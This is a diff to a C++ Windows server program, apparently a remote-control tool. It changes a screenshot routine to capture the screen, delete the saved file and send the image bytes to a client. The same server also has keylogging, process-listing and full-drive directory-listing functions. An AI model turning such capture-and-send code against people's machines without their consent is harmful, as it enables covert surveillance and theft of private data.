@@ -7,6 +7,7 @@
 #include <filesystem>
 #include <tlhelp32.h>
 #include <sstream>
+#include <fstream>
 
 // Screen shot
 #include <gdiplus.h>
@@ -24,7 +25,8 @@ using std::cin;
 using std::cout;
 using std::cerr;
 using std::stringstream;
-
+using std::ifstream;
+using std::ios;
 using namespace Gdiplus;
 
 Server::~Server(){
@@ -413,6 +415,8 @@ Response Server::listProcess(){
 }
 
 Response Server::screenShot(){
+    cout << "Server: Received screen capture instruction.\n";
+
     GdiplusStartupInput gdiplusStartupInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -428,7 +432,16 @@ Response Server::screenShot(){
     BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
 
     CLSID clsid;
-    GetEncoderClsid(L"image/png", &clsid);
+    int status = GetEncoderClsid(L"image/png", &clsid);
+    if(status == -1){
+        cerr << "Server: Can't capture screen.\n";
+
+        DeleteDC(hdcMem);
+        ReleaseDC(NULL, hdcScreen);
+
+        GdiplusShutdown(gdiplusToken);
+        return Response(SCREENSHOT_RESPONSE, FAIL_CODE, 0, NULL); 
+    }
 
     Bitmap bmp(hBitmap, (HPALETTE)0);
     bmp.Save(L"screenshot.png", &clsid, NULL);
@@ -437,9 +450,23 @@ Response Server::screenShot(){
     DeleteDC(hdcMem);
     ReleaseDC(NULL, hdcScreen);
 
-    GdiplusShutdown(gdiplusToken);
-    uint32_t errCode = OK_CODE;
-    return Response(SCREENSHOT_RESPONSE, errCode, 0, NULL);  
+    //GdiplusShutdown(gdiplusToken);
+
+    ifstream fi("screenshot.png", ios::binary);
+    if(fi.fail()){
+        cerr << "Server: Can't open file screenshot.png\n";
+        return Response(SCREENSHOT_RESPONSE, FAIL_CODE, 0, NULL);
+    }
+
+    vector <char> buffer = vector<char>(std::istreambuf_iterator<char>(fi), {});
+
+    fi.close();
+    status = remove("screenshot.png");
+    if(status)
+        cerr << "Server: Can't delete file screenshot png or file not exits\n";
+
+    cout << "Server: Sent screenshot.png to client.\n";
+    return Response(SCREENSHOT_RESPONSE, OK_CODE, buffer.size(), buffer.data());  
 }
 
 Response Server::keyLog(){
@@ -452,7 +479,7 @@ Response Server::dirTree(){
     string result = printDirectoryTree("C:\\", 0);
     
     errCode = OK_CODE;
-    
+
     cout << "Server: Directoried tree.\n";
     return Response(DIR_TREE_RESPONSE, errCode, result.size() + 1, (void*)result.c_str());
 }
